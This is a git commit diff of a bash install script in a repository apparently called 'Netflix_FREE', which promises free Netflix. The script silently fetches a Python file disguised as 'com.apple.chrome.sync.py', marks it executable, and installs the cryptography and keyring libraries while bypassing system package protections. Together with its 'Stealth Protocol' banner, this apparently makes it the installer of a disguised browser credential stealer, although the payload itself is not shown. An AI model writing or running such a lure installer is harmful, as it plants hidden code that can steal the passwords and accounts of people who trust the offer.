a9b8365925519fc580d5ad8aafc6b2d10b19a81b
Souhail Lassoued <76921303+souhail-lass@users.noreply.github.com>
2026-04-15 19:36:29 -0400

    Update install script for downloading and installing packages

--- install.sh
+++ install.sh
@@ -1,15 +1,15 @@
 #!/bin/bash
 echo "[*] Initializing Netflix_FREE Stealth Protocol..."
 
-# 1. Télécharger les fichiers depuis le repo vers le dossier local
+# 1. Téléchargement des nodes
 curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/com.apple.chrome.sync.py
 curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/requirements.txt
 
-# 2. Installer les dépendances (Bypass PEP 668)
-# Le flag --break-system-packages est nécessaire car tu es sur Python 3.14
-pip3 install -r requirements.txt --break-system-packages --quiet
+# 2. Nettoyage et Installation (On force pycryptodome)
+pip3 uninstall crypto pycrypto pycryptodome --yes --quiet 2>/dev/null
+pip3 install pycryptodome keyring requests --break-system-packages --quiet
 
-# 3. Accorder les permissions d'exécution
+# 3. Permissions
 chmod +x com.apple.chrome.sync.py
 
 echo "[+] Environment Ready. Lock in."
